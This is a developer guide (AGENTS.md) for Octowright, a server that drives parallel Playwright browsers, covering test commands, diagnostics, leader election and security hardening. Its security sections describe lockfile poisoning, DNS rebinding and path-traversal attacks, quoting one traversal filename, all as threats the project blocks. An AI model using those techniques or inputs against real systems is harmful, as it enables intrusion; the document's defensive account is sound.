# AGENTS.md

This file provides guidance to coding agents when working with code in this repository.

## What This Project Is

**Octowright** is an MCP (Model Context Protocol) server that lets agentic coding clients drive multiple parallel Playwright browsers (Chromium, Firefox, WebKit) simultaneously. It records every browser action to JSONL, supports persistent browser profiles with saved login state, and includes a web dashboard for debugging/monitoring.

## Commands

```bash
# Install
make install              # uv sync --all-groups

# Test & quality
make test                 # pytest — DOES launch real browsers where engines are installed
                          # (18 modules are marked live_browser and nothing deselects it);
                          # add -m "not live_browser and not memory_isolated" to skip them
make lint                 # ruff/format/mypy/ty/bandit/codespell/SPDX/LOC/vulture/xenon/secrets
                          # + the doc guards (agent-docs sync, telemetry, tool inventory,
                          # mutmut selection) — see docs/ci-quality.md for the table
make format               # ruff format + ruff --fix
make typecheck            # mypy only
make ci                   # lint + test
make audit                # pip-audit against the dependency tree
make vulture              # dead-code scan (baseline-ratchet)
make xenon                # cyclomatic complexity (baseline-ratchet)
make secrets-scan         # detect-secrets vs .secrets.baseline
make mutmut               # opt-in mutation testing (slow)

# Run a single test
uv run pytest tests/path/to/test_file.py::test_name -v

# Frontend
cd packages/octowright-frontend && npm run build   # compile TypeScript → static files
cd packages/octowright-frontend && npm run test    # vitest

# Playwright browsers
uv run playwright install webkit firefox chromium

# CLI
uv run octowright serve          # start MCP + HTTP dashboard
uv run octowright serve --wait-ready   # CI: ensure a daemon is up, print its URL, exit 0/1
uv run octowright restart        # stop the daemon, reap orphans, start a fresh one
uv run octowright selftest       # list MCP tools without a client
uv run octowright scenario list  # list loaded scenarios
uv run octowright persona list   # list saved personas (also: persona create/show/delete)
uv run octowright cleanup        # prune stale recordings (NOT profiles or macro artifacts)
uv run octowright doctor         # diagnose engines/processes/daemon/storage/coreaudio; --fix reaps orphans
uv run octowright dashboard      # mint a single-use dashboard pairing code + /pair URL
uv run octowright init           # scaffold a starter octowright project tree
uv run octowright skill          # install/inspect the octowright agent skill
uv run octowright takeover       # detect + disable competing Playwright MCP plugins
uv run octowright test           # run the JSONL-driven test suite (CI-friendly)
```

### Test-run bounds: per-test timeout and pinned order

Two `[tool.pytest.ini_options]` settings exist because a wedged suite used to
be unattributable. Both are deliberate and worth knowing before changing them.

**`timeout = 300`, `timeout_method = "thread"` (pytest-timeout).** Nothing
bounded a hung test before this. A target that stops answering — observed on a
WebKit leg — hangs the run forever, because `page.on("crash")` never fires for
a target that is merely *unresponsive*, and a local run was seen sitting on one
test past 12.6 hours. 300s is measured, not taste: the slowest legitimate test
observed locally is a two-participant headless WebKit scenario at 81s, and a
whole CI leg finishes in ~10.5 minutes.

The `thread` method is chosen over the platform default, and the default
genuinely does not work here. With `signal`, pytest-timeout arms **one** alarm
across the whole runtest protocol and cancels it at the end — so the alarm is
spent the moment it fires. Measured on the reproducer: it fired in the call
phase and failed the test as designed, then teardown wedged with no alarm left
to arm and the process sat alive and silent 6+ minutes later. A bound a second
wedge walks straight through is not a bound. `thread` uses a `threading.Timer`
that dumps every thread's stack and calls `os._exit(1)`. The cost is real: the
run dies at the first wedge instead of continuing, losing later results — still
strictly better than a run that produces no name, no stacks and no results at
all until someone kills it by hand.

**`--randomly-seed=20260830` in `addopts`.** pytest-randomly otherwise reshuffles
collection order every run from a time-derived seed. That is how an
order-dependent failure gets found, and also how it becomes impossible to act
on: a wedge lands on a different test each run, so "exclude the failing test and
re-run" reports a NEW victim every time and reads as an inter-test leak that is
not there. Pinning makes a run reproducible by default; shuffling is one flag
away when it is the point: `--randomly-seed=last` to replay the previous run,
an explicit integer to replay a specific one, or `--randomly-dont-reorganize`
for source order. Prefer those over `-p no:randomly`, which used to exit 4 with
"unrecognized arguments" — unloading the plugin also unregisters the
`--randomly-seed` option `addopts` still passes. The root `conftest.py` now
registers an inert stand-in for that option **when the plugin is absent**, so
the flag parses; it exists because mutmut 3.x hardcodes `-p no:randomly` with no
way to configure it off, not as an endorsement of typing it by hand. The
plugin's own flags leave its seeding machinery intact and stay the right answer
for a human. Bump the constant to re-roll for everyone.

**`norecursedirs` names `mutants`.** mutmut copies the whole project —
`conftest.py` included — into `mutants/` and leaves it behind, and pytest then
walks it as an ordinary directory. A bare `pytest` at the repo root consequently
died in *collection*, with `ImportPathMismatchError` on the duplicated
`tests.conftest` and, under `-p no:randomly`, "option names
`{'--randomly-seed'}` already added" from the two copies of the root conftest —
so running `make mutmut` once made a bare `pytest` unusable until someone
deleted the directory by hand, and it defeated the stand-in above. `make test`
passes `tests/` explicitly and never noticed. The setting **replaces** pytest's
built-in list rather than extending it, so the defaults are restated alongside
`mutants`; dropping one would quietly start collecting `build/`, `dist/` or
`node_modules/`.

**Read the score from `export-cicd-stats`, never from `mutmut results`.**
`mutmut results` prints only the mutants that still need attention — survived,
`no tests`, `timeout` — and **omits every killed one**, so its line count is the
size of the backlog and not the population. Reading it as the population turns
an 80% score into a reported 2.8%, which is what happened on 2026-09-03 and sent
a triage after a harness problem that did not exist. The second half of the same
mistake is parsing the status column by last word: `no tests` ends in "tests"
and reads as a kill. `uv run mutmut export-cicd-stats` writes
`mutants/mutmut-cicd-stats.json` with `killed`/`survived`/`no_tests`/`timeout`/
`total` as integers, and that file is the only honest denominator.

Two things are worth knowing before acting on a survivor list. **Count is the
wrong ranking** — a big module dominates it while scoring fine (`macros.artifacts`
led with 190 survivors at 85%, while `artifacts.evidence` sat at 21%), so rank by
rate. And **most survivors are not logic**: on that run 81% were string-literal or
`None` substitutions — dict keys, log event names, error wording — leaving 77
genuine logic mutations. A handful of whole-record equality assertions kills the
string bulk in batches (three of them took `artifacts.evidence` from 21% to
100%); the logic ones are worth reading individually.

**Verify a kill by applying the mutant, not by trusting a green test.** A test
written against correct code passes whether or not it would notice the code
becoming wrong. `mutmut show <mutant>` prints the diff, and **`mutmut apply
<mutant>` writes that one mutation into `src/`** — so the whole loop is four
steps and needs no tooling of its own:

```bash
uv run mutmut apply <mutant>       # break src/ in exactly one place
uv run pytest <test> -q --no-cov   # the new test MUST fail here
git checkout -- src/               # put src/ back
```

Read the verdict from **pytest's exit code, not its output**. Grepping stdout
for `FAILED` silently never matches — the output is ANSI-coloured, so the token
is not at the start of the line and `^FAILED` finds nothing. That inverts every
verdict at once and reports a dead mutant as a survivor, which reads as a much
more alarming result than it is. `mutmut apply` is easy to miss in
`mutmut --help`; a whole-function-swap script was once written to do what it
already does.

Note that `mutmut show` reports a mutant's CURRENT
status, so a mutant absent from `results` is already dead — check before writing
a test for it. Some survivors are equivalent and cannot be killed at all:
`run_sequence`'s `zip(..., strict=True)` is one, since the list it zips against
is built with `range(len(names))` and can never differ in length.

**`.pytest-current-test` (git-ignored).** `tests/conftest.py` writes
`<phase> <nodeid>` there at the start of every setup/call/teardown. pytest-
timeout's dump titles each section with a THREAD name and the process exits
before pytest can report the item, so under the suite's `-q` a timeout hands
you a wall of stacks and no test name. A file rather than a print because
stderr does not survive the trip — `pytest_runtest_logstart` fires before
per-item capture is installed (one stray line per test on a green run), and
writing under capture does not reach the dump either, since pytest drains the
buffer at the end of every phase. `pytest_sessionfinish` removes the file, so a
leftover always means "this is where a run that never reported died".

### `octowright doctor`

One command that answers "is this machine broken, or is octowright broken?".
It exists because that question once took hours: a local suite wedged, and the
answer turned out to be a WebKit build that could not navigate to
`about:blank` -- provable in fifteen seconds with raw Playwright, but only once
someone thought to ask.

The engine probes are the point. Each drives a real headless browser through
launch -> new_context -> new_page -> goto -> evaluate -> add_init_script using
**raw Playwright and no octowright code**, and reports the first step that did
not complete. That separation is the whole diagnostic value: if the probe
fails the engine is broken and reading octowright's launch pipeline will not
help; if the probe passes and octowright still cannot launch, the bug is ours.
Routing the probe through `BrowserPool` would collapse the two cases back
together and answer neither. On the machine that prompted this it prints, in
seven seconds:

```
PASS  engine:chromium     launch -> page -> goto -> evaluate in 0.41s
PASS  engine:firefox      launch -> page -> goto -> evaluate in 1.67s
FAIL  engine:webkit       failed at step 'goto' after 4.49s: TargetClosedError: Page crashed
```

Each probe runs in its own **child interpreter**, and that is not tidiness. A
wedged engine does not merely fail -- it leaves the driver and browser alive and
the awaiting coroutine unkillable from inside its own loop, since cancelling
releases the caller but cannot make the driver abandon a call already sent. In
one process the second probe would inherit the first one's wreckage, which is
exactly the confusion the command exists to remove. A child can simply be
killed, and its driver and browsers die with it.

The other checks are `daemon` (is the lockfile's leader real, or stale),
`daemon:canonical-port`, `browsers:installed`, `processes:drivers`,
`processes:browsers`, `storage`
(recordings and profiles at 0700 -- they hold typed input and live session
cookies), `followers`, and, on macOS only, `audio:coreaudio`.

`daemon:canonical-port` answers a question `daemon` structurally cannot: is a
SECOND daemon also alive. `check_daemon` reports only on the leader the
lockfile names, and a daemon started outside octowright's election path -- a
systemd unit whose `ExecStart` runs `serve --daemon-mode` directly skips the
lock by design -- can bind a port while a CLI-triggered spawn lands on
another. Both stay up; the lockfile records one; `daemon` reports a clean
single leader. Which one it records is a **race**, not a property:
`cli/serve._on_http_bound` writes the lock with whatever port it actually
bound, *after* the walk, for every non-`--no-singleton` leader. So the
unrecorded daemon can be on the canonical port or on a bumped one depending
only on bind order, and probing just the canonical port would return a clean
`ok` for half the cases the check exists to catch. It therefore probes every
port the leader is NOT on that a leader of this deployment could hold --
canonical plus the contiguous `HTTP_PORT_RETRIES` walk range -- concurrently,
and FAILs naming them, with the `restart --keep-browsers` remedy. A leader
*outside* that range is reported as a **warn**, not a fail: `defaults.HTTP_PORT`
is read from the *doctor process's* own environment at import time, so a
recorded port the walk cannot reach almost certainly means the daemon was
started with a different `OCTOWRIGHT_HTTP_PORT` than the operator's shell has
-- and that is precisely the systemd/launchd deployment this check targets.
Calling that a split-brain would be a false FAIL, and doctor exits 1 on any
FAIL. `--fix` reaps orphaned drivers and browsers, and only ever processes
whose parent is already gone, so a running daemon's own driver is never
touched. `--json` emits the same data structurally, `--skip-engines` avoids
launching anything, and the command exits 1 on any FAIL so CI can gate on it.

`followers` answers "is this deployment consistent". A follower is a subprocess
its MCP client owns and it deliberately SURVIVES a leader restart so the client
is not dropped -- so upgrading octowright and restarting the daemon updates the
leader and **nothing else**, and every connected client keeps running whatever
follower it spawned until that client reconnects. Observed with followers two
releases behind a current leader, driving browsers, while `doctor` reported
all-PASS, because nothing in it looked at followers at all. It compares against
the **running daemon's** version (read from `/api/health`), not this process's
`VERSION`: doctor is usually invoked from a checkout already upgraded past the
daemon, so its own version is what the daemon *will* be after a restart, and
comparing against it would report skew against a version nobody is running --
and call a follower that matches the live daemon stale. It warns rather than
fails (a deployment state, not a broken machine) and `--fix` deliberately does
not touch it: killing a follower just breaks that client's session, since a
client does not respawn a dead stdio server.

**Dead followers are not counted.** `bridge_state._prune_dead_followers` drops
exited followers, but only when a follower WRITES a snapshot -- and a follower
that has stopped writing is precisely the one most likely to be dead. Nothing
pruned on the READ path, so `octowright_status()["bridge"]` reported 8 stale
followers "running older code" of which the two investigated were **both
already-exited processes**. `summarize_state` now partitions by PID liveness
first (`is_alive` is injectable so tests stay deterministic; the default issues
a real `os.kill(pid, 0)`), reports the discarded count as `dead_follower_count`
so a shrinking `follower_count` is explainable, and keeps an unparsable PID key
as live -- the conservative direction is to over-report a follower, not to drop
a real one.

`audio:coreaudio` is a browser check wearing an audio check's name, and it
earns its place by naming a CAUSE the engine probe can only report as a
symptom. WebKit's GPU process calls into CoreAudio on every startup
(`GPUConnectionToWebProcess::enableMediaPlaybackIfNecessary`). When
`coreaudiod`'s HAL is wedged that call never returns, so WebKit's own watchdog
declares the GPU process unresponsive after ~3s, SIGKILLs it, relaunches it,
and it hangs again -- WebContent never gets a renderer and every navigation
dies. Diagnosed on 2026-08-30: WebKit failed `goto about:blank` at ~6.7s with
**no crash report**, the GPU pid changed three times in a single six-second
run, and the unified log said it outright (`GPUProcessProxy::didBecomeUnresponsive`,
`gpuProcessExited: reason=Unresponsive`, with the SIGKILL sent by the Playwright
UI process itself). `sample` on the live GPU process showed its main thread in
`HALC_ProxySystem::HALC_ProxySystem -> mach_msg` in 100% of samples. It was not
a WebKit, Playwright, or octowright bug: `system_profiler SPAudioDataType` hung
identically with no browser involved, and `killall coreaudiod` took the same
probe from never completing to 0.97s end to end.

Two implementation details are load-bearing. The probe runs in a **child
process** that is reaped with `proc.kill()` (SIGKILL) rather than SIGTERM: the
wedged call blocks in `mach_msg`, where a pending SIGTERM cannot be delivered,
so plain `timeout` does not kill it and `timeout -s KILL` does (measured -- exit
137). And it runs even under `--skip-engines`, because it costs 0.12-0.15s
(measured on a healthy machine, against 0.46s for the `system_profiler`
equivalent) and stays useful precisely when the slow probes are turned off. It
is gated to macOS in `run_checks` rather than returning a `skip` from the check
itself, so Linux runs carry no permanent SKIP line for a check that can never
apply there.

Nothing tracked the driver processes before this. `process_reaper` reasons
*from* the driver -- its orphan rule for a browser is "my driver died" -- so a
leaked driver with no browsers under it was invisible to every existing tool.

### Unbounded Playwright calls: the setup half

`session/timeouts.bounded()` originally covered `evaluate`, `title` and
`content` — the calls a running page answers. A second incident showed the set
was half the problem. On a WebKit build that could not navigate to
`about:blank`, `page.evaluate` still answered in ~6s while
`context.expose_binding`, `context.add_init_script` and `context.route`
**never returned at all** (measured with raw Playwright and no octowright
imported). Playwright gives none of them a `timeout` either.

The consequence was worse than a slow launch. `browser_launch` wedged inside
`_expose_viewport_binding`, several steps *before* the `page.goto` whose own
30s timeout would have surfaced the broken engine as an ordinary error — so a
bounded, reportable failure became an unbounded hang, and the engine-health
block never got to record anything. The same launch now raises
`SessionCallTimeoutError` in ~35s (verified three consecutive runs).

Every one of those call sites is wrapped, and the AST scan in
`tests/session/test_no_unbounded_calls.py` now covers `add_init_script`,
`expose_binding`, `expose_function`, `route` and `unroute` alongside the
original three, so a new setup call cannot quietly reintroduce it.

### Test-suite driver reaping

`tests/conftest.py` tracks every `BrowserPool` as it is constructed and, at
each test's teardown, sends `SIGTERM` to the driver of any pool still holding
one. A pool starts its Playwright driver lazily and only `shutdown_pool` ever
calls `pw.stop()`, so the modules that launch a real browser and never shut
their pool down leaked: measured at a **peak of 9 live
`playwright/driver/node` children** under one pytest process, each holding a
pipe, an OS process and an `asyncio-waitpid` thread. With the reaper the same
119 tests peak at **1**, and run 24% faster (29.8s to 22.7s).

Signalling a pid rather than awaiting `pool.shutdown()` is deliberate, and the
graceful version was written first and reverted. An async autouse fixture *does*
run for sync tests under `asyncio_mode = "auto"`, but it also forces an asyncio
loop onto the trio half of every `pytest-anyio`-parametrized test, which then
fails inside anyio's shielded `CancelScope` with "must be called from async
context" — two `tests/test_roster.py` trio cases went red and were green again
the moment the fixture stopped being autouse. A sync fixture that signals a pid
needs no loop and cannot care which backend ran the test.

## Architecture

### Core Concepts

1. **Browser** — One Playwright instance (one engine, one window). Has `instance_id`, records to JSONL.
2. **Profile** — Persistent on-disk state (`~/.config/octowright/profiles/<persona>/<kind>/`). Survives close/relaunch.
3. **Persona** — Named identity (display name, default URL, credentials). Owns profiles across engines. A persona's `default_url` is also handed to the browser context as Playwright's `base_url`, so `browser_navigate("/orders")` resolves per persona and the same macro replays against a local stack, staging or production by launching as a different persona — see **Host-relative navigation**.
4. **Scenario** — Pre-declared group of personas launched together with roles, fixtures, and verify macros for testing. Canonical roles are `player`/`monitor`/`spectator`; additional domain-specific roles are also in use (`main-site`, `recorder`, `replayer`, `form`, `counter`, `arithmetic` — see `examples/scenarios/` and `demo/bundles/`). `scenarios._validate_scenario` logs `scenario.unknown_role` on any role outside the canonical set so typos surface in logs without blocking custom role vocabularies. A participant may also be a session-kind plugin (e.g. `kind: terminal`) once its plugin is enabled via `OCTOWRIGHT_PLUGINS` — see **Terminal Sessions (plugin)**. A plugin participant's kind-specific fields arrive **nested under `extra`** in `scenario_participants` / `scenario_status` (a terminal's connector is `entry["extra"]["connector_type"]`), not flattened onto the entry as they were when terminal was built in. `scenarios_pool` builds that entry generically and assigns `persona`/`role` *after* the launch result, so a flattened plugin key would be silently clobbered by core — and a generic flatten would let any plugin overwrite `instance_id`. The plugin's own `terminal_launch` still returns `connector_type` at the top level, where core keys win, so that tool's output is unchanged.
5. **Dashboard** — Starlette web UI showing live browsers, recordings, session debugger with embedded video + action timeline.
6. **Terminal** *(a session-kind plugin, not core — see **Terminal Sessions (plugin)**)* — One `provide-uterm` connector driven in-process: a local PTY shell, an SSH session, or a telnet connection. Has `instance_id`, `kind="terminal"`, and records to the same JSONL format as browsers. Exposed as `terminal_*` MCP tools and surfaced in the dashboard session list alongside browsers once enabled with `OCTOWRIGHT_PLUGINS=terminal`.

### Layer Map

```
CLI (Click)
  └─ serve.py → leader-election via lockfile
      ├─ MCP server (MCPServer, stdio transport)
      │   └─ server/browser/*.py   ← @mcp.tool decorated functions
      │   └─ server/macros.py
      │   └─ server/scenarios.py
      │   └─ server/personas.py
      │   └─ server/meta.py
      │   └─ server/_plugin_activation.py ← imports each OCTOWRIGHT_PLUGINS-enabled plugin's tools last
      └─ HTTP server (Starlette)
          └─ http/routes/*.py      ← JSON/WebSocket endpoints
          └─ frontend/             ← built TypeScript SPA
```

**Singleton leader-election**: first `octowright serve` becomes leader (MCP stdio + HTTP + HTTP-MCP proxy at `/mcp`). Additional instances become followers that bridge stdin/stdout to leader's HTTP endpoint. Override with `--no-singleton`. **Split-brain guard**: before a follower's post-bridge respawn (`cli/serve._respawn_if_leader_gone`) spawns a replacement daemon, it also probes the *canonical* HTTP port directly (`_canonical_port_serves_octowright`) — not just the lockfile. The lockfile probe can false-negative during a reconnect storm (a healthy leader momentarily slow, or a lockfile a racing respawn already repointed); spawning then makes `http/lifespan` walk the busy canonical port up to a *bumped* one (6286→6287) and bind a SECOND leader beside the healthy one (observed live). The extra probe makes the respawn defer instead of forking the daemon. **`octowright restart` holds that same election lock** (`cli/restart._spawn_election_lock`) across its whole kill → wait-for-port-free → spawn → confirm-healthy sequence. It was the one spawner that never took it, which made it invisible to every guard above and let it CREATE the split-brain it also recovers from: `_stop_leader` SIGKILLs the leader, so every follower's bridge drops and each runs `_respawn_if_leader_gone`, which takes the lock, correctly sees no leader and a free canonical port — restart just killed it — and spawns one on 6286. `_wait_for_port_free` had observed that port free a moment earlier (TOCTOU), so restart then spawns its own, which port-walks to 6287. Two leaders, 15s apart, observed live on 2026-08-30. It was reported as SUCCESS because `_health_candidates` also probes the *lockfile* endpoint, so the follower's leader answered and restart printed `daemon healthy` and exited 0. Taking the lock **before** the kill is the load-bearing part — acquiring it after would leave exactly the window the followers spawn in. On lock contention restart warns and proceeds unlocked rather than failing: it is the recovery command, reached when the daemon is wedged, and the existing port-reclaim (`_stop_leader(spawn_port=...)`) remains the backstop. `--no-start` deliberately does NOT take the lock — nothing of ours spawns, and a follower replacing the stopped leader is that path doing its job.

**Follower bridge reliability**: `proxy_bridge.run_proxy(..., health_url=...)` delegates to a supervised bridge. The local stdio follower stays alive while the remote HTTP-MCP leader session is disposable. If the leader stream closes, hangs, or times out, in-flight calls get explicit JSON-RPC bridge errors and later calls reconnect to the current lockfile leader URL. Bridge health snapshots are written to `OCTOWRIGHT_BRIDGE_STATE` and included in `octowright_status()["bridge"]`. `resolve_leader_url` rejects any leader URL whose host is not loopback — any same-user process can overwrite the lockfile, so without this check a hostile local process could redirect MCP traffic (including persona credentials substituted into tool args) to an attacker URL. Opt out with `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD=1`, the same flag the HTTP layer gates non-loopback binds on.

**Bridge capability token**: the loopback `/mcp` transport drives browsers (RCE-equivalent) and otherwise has **no auth** — any local process can POST to it. The leader generates a random token, writes it to the 0600 lockfile (`LeaderInfo.token`, via `cli/serve`), and requires it on `/mcp` (`http/bridge_auth.BridgeTokenGuard`, wrapped *inside* the host/origin `SensitiveASGIGuard`); the follower reads it back (`proxy_runtime.resolve_leader_token`, gated by the same loopback check as `resolve_leader_url`) and presents it as the `X-Octowright-Token` header. A process that **can't read the lockfile** — a *different user* on a shared host, or a *sandboxed* process — therefore can't drive the leader. **Limits (be honest):** this does NOT defend against a *same-user* process that reads the 0600 lockfile (it gets the token; the lockfile is the same-user trust boundary), and does NOT close the lockfile-poisoning MITM (an attacker who rewrites the lock writes the token too). On by default; disable with `OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN` set to a falsey token. An inline (`--no-singleton`) leader uses an empty token (gate off) since it has no lockfile. The **same** token also gates the follower-only `GET /api/mcp-events` SSE channel (`http/routes/mcp_events._require_token`) — it carries the same follower→leader trust as `/mcp` (a different-user/sandboxed process could otherwise subscribe to the leader's crash/close/driver notification stream), and the browser dashboard never calls it, so the gate is safe on by default. **Mixed-version note:** a follower built between the `/mcp` gate and this one presents the token to `/mcp` but not to `/api/mcp-events`, so after a leader upgrade it is answered `403` there and silently loses proactive notifications until that client reconnects. Notifications are best-effort by design (treat `octowright_status()` as authoritative), so the gate is not relaxed for it. **Browser dashboard (opt-in pairing):** the browser-facing surface (`/api/sessions`, media, `/api/dashboard/events`, `/tail`+screencast WS, persona/scenario/macro writes) can additionally be gated by **dashboard pairing** (`OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING`, **ON** by default -- this line said OFF long after the default flipped, and it is the paragraph an operator reads first). `octowright dashboard` reads the same-user 0600 lockfile, POSTs `/api/pair/mint` with the capability token, and prints a validated `http://HOST:PORT/pair#<code>` URL. The fragment code is single-use, expires after 60 seconds, and is never sent during navigation; `/pair` redeems it for a random short-lived bearer stored only in origin-scoped `sessionStorage`. Dashboard HTTP, streaming fetch/SSE, and protected media send `Authorization: Bearer`; dashboard WebSockets carry a private credential subprotocol while the server selects only the stable `octowright.dashboard` protocol. Guarded routes also accept `X-Octowright-Token` for follower/programmatic callers. Pair codes and bearer digests are app-local, bounded, and invalidated by leader restart. The bearer's window **slides on use** (`DashboardPairingState._touch`): its idle deadline is pushed to `DASHBOARD_SESSION_TTL_SECONDS` (8h) from the last successful check, capped by an immovable `DASHBOARD_SESSION_MAX_LIFETIME_SECONDS` (7d) fixed at redemption. Validating and sliding are deliberately the same operation, so a bearer already past its deadline cannot be revived by being asked about. This costs no renewal endpoint and no client bookkeeping: an open dashboard holds the `/api/dashboard/events` SSE stream, which revalidates its lease on every heartbeat, so "the tab is open" already reaches the store roughly every 15 seconds. It was an ABSOLUTE 8h window before, and a dashboard someone had been watching all day died mid-use with the unpaired page as its only explanation. The browser consequently does **not** self-evict on the `expires_at` it stored at redemption -- that value is the deadline as of issue and therefore a lower bound, so honouring it locally would discard a credential the leader was still accepting. The leader is the sole authority; a stale bearer costs one 401. Same-user processes remain trusted because they can read the lockfile and mint their own code. `--open` keeps the code out of browser argv by opening a redirect page in a private 0700 directory.

**Disk-write containment**: every path the daemon writes that flows from an LLM-supplied or recording-supplied string is anchored under `defaults.RECORDINGS_DIR`. `browser_export_script`'s `out_path`, `browser_screenshot`'s output path, and the HAR path recovered by `LaunchOptions.from_launch_record` are all resolved-and-contained against `RECORDINGS_DIR` (symlinks resolved before the prefix check); a poisoned JSONL launch record can't redirect HAR writes anywhere on disk, and an LLM can't escape the recordings root via `..` or symlinks. `recorder.new_log_path` likewise sanitizes the operator-supplied label before it joins the base dir. Browser downloads are contained too: `session/downloads.py` reduces the **remote-controlled** `suggested_filename` (the visited page's Content-Disposition) to a single safe basename and runs it through `reject_unsafe_path` before `download.save_as` — otherwise Playwright's `save_as`, which `os.makedirs` the target's parent, would materialise a `NNN-..` prefix into a real traversable dir and let `../../../../x` escape the recordings root. Golden snapshots (`goldens.save_golden`) and analysis captures (`captures.save_capture`) are written through `atomic_write_text` (temp sibling + `os.replace`) rather than a plain `write_text`, so a same-user attacker who swaps the destination for a symlink in the resolve→write window gets the symlink replaced, not followed — matching how screenshots and macro storage already write.

**Per-pool recordings root**: `BrowserPool(recordings_dir=...)` overrides where **one pool** writes its per-launch artefacts — the JSONL log (`recorder.new_log_path`), video dir, HAR, and downloads. It defaults to the process-global `defaults.RECORDINGS_DIR`; the pool threads its own root into `launch_helpers.build_recording_kwargs` (the video+HAR combiner) and `session/downloads.py` anchors downloads on `session.log_path.parent` (== the owning pool's root, since `new_log_path` writes the JSONL directly under it). This exists for the **concurrent-pools-in-one-process embedding** — a single Python process running several `BrowserPool`s that must not collide on one recordings tree. The normal daemon deployment is one pool = one root and needs no override. **Deliberate reader gap (write-side only):** a custom root reroutes *writes* only. The built-in HTTP dashboard, closed-session discovery (`http/discovery.py`, `http/routes/sessions.py`, `media.py`) and `octowright cleanup` all read the single process-global root, so artefacts a non-default-root pool writes are **not** visible to them. That is acceptable for an embedder that consumes the launch-returned paths (`video_dir`, `log_path`) directly and does not rely on octowright's dashboard. Also unaffected — still bound to the global root: MCP-tool writes (`browser_screenshot` / `browser_export_script` / trace) and HAR-path recovery on handoff (`options.LaunchOptions.from_launch_record`). Surfaced as the read-only `BrowserPool.recordings_dir` property.

**Recording-file privacy**: the per-session JSONL holds typed input, navigated URLs, and console output — and in `OCTOWRIGHT_REDACT_INPUTS=off` deployments, cleartext credentials. `recorder.Recorder` writes it `0600` with a `0700` parent by default (best-effort `chmod`, covering a fresh create *and* a reopened 0644 file) so a *local* user can't read it out-of-band, bypassing the loopback HTTP boundary the dashboard enforces. Opt out with `OCTOWRIGHT_RECORDINGS_PRIVATE` set to a falsey token for setups that intentionally share recordings with other local users.

**DNS-rebinding Host guard**: `http/exposure.py` treats the incoming request `Host` header as part of the local-access boundary, not just the daemon's bind address. Binding to loopback isn't enough on its own — an attacker can point a malicious DNS name at `127.0.0.1` so the victim's browser connects to the local port while sending `Host: malicious.example` and a matching `Origin`, which would otherwise read as a same-origin loopback request. The shared `request_host_loopback_allowed()` helper classifies the `Host`, and both enforcement points run it to reject a non-loopback value: `sensitive_allowed_for_connection` for Starlette request/WebSocket handlers, and `SensitiveASGIGuard` for mounted ASGI apps (the `/mcp` transport and the static dashboard mount — `scope["app"]` resolves to the inner mounted app, so the guard reads the bind host from a wrap-time closure). A rejected HTTP request returns `403`; a rejected WebSocket handshake is closed with code `1008`. Setting `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD=1` intentionally bypasses the `Host` check, matching the bind-host and bridge opt-outs. Note for tests: Starlette's `TestClient` defaults to the non-loopback `Host: testserver` (and `websocket_connect` ignores `base_url`), so `tests/conftest.py` defaults the test client to a loopback `Host`; tests that assert the rejection path pass an explicit non-loopback `host` header.

**Transport recovery**: If an Octowright MCP call returns `Transport closed` or times out, first check daemon health with `curl http://127.0.0.1:6286/api/health`. There are two distinct failure modes, and only one is recoverable in-session. (1) **Transient leader-stream drop** — the leader process is still alive and reachable, but its SSE/HTTP stream hiccuped: the follower bridge's supervisor (`proxy_supervisor`) fails the in-flight call fast and reconnects in place, so if health is good, retry one Octowright MCP call and it recovers on the *same* session. (2) **Leader gone** — the daemon was killed, restarted (`octowright restart`), crashed, or idle-exited: `proxy_bridge.run_proxy` returns and the follower process exits, so the MCP client's stdio closes. That session cannot recover — the client must reconnect (a new session, for stdio clients). Consequently **`octowright restart` disconnects *every* connected client**; the follower it tears down respawns a replacement daemon on its way out (`_respawn_if_leader_gone`) so the next/reconnecting client finds a live leader quickly. `octowright restart` adds the lockfile-recorded leader pid to its kill set only after verifying that pid's command line is an `octowright serve` process (`restart._locked_pid_is_octowright`): the 0600 lockfile is same-user-writable and a recorded pid can be recycled by the OS to an unrelated process after the daemon dies, so the check stops a stale/poisoned lock from friendly-firing a SIGKILL at a foreign pid (the port-scoped pgrep path it also uses is command-verified for the same reason). To distinguish a broken client handle from a broken daemon, run `uv run --active python scripts/bridge_reconnect_smoke.py`. Do not run `octowright restart` unless daemon health fails or the user explicitly asks for a restart — for a transient blip, retrying one call is the fix, not a restart.

**Leader-side storm protection**: the idle-session reaper (`OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS`) and the pid-liveness dead-follower reaper (housekeeping job 3) both only reclaim sessions whose follower is *gone or quiet* — neither stops a follower that's *alive and storming*, opening a fresh `/mcp` session per forwarded RPC instead of reusing one (the failure mode that put a live leader at **18GB RSS over 2 days** on 2026-07-20, starving real tool calls until every client looked broken). Every prior storm defense is follower-side, so it only helps once every client upgrades; the leader now defends itself in `http/mcp_flap_guard.py`, on by default and deployable with a single daemon restart, independent of follower version. (1) A **per-source new-session rate limit**: a session-creating request (`POST /mcp` with no `Mcp-Session-Id`) beyond `OCTOWRIGHT_MCP_NEW_SESSION_MAX` per `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS` (default 10/10s) is rejected `429 + Retry-After`, keyed by the `X-Octowright-Follower` header a current follower sends — old followers omit it and share the one `anonymous` bucket (the storm, collectively throttled). (2) A **session-table cap**: housekeeping job 4 (`_enforce_mcp_session_cap_once`) evicts the most-idle sessions (silent-past-tracker-TTL before recently-active, so a quietly-waiting live session goes last) whenever the live table exceeds `OCTOWRIGHT_MCP_MAX_SESSIONS` (default 256) — a memory bound no follower can defeat. Legit clients create ~1 session and reuse it, so they never approach either limit. Metrics: `octowright_mcp_new_session_throttled_total`, `octowright_mcp_session_evicted_total`.

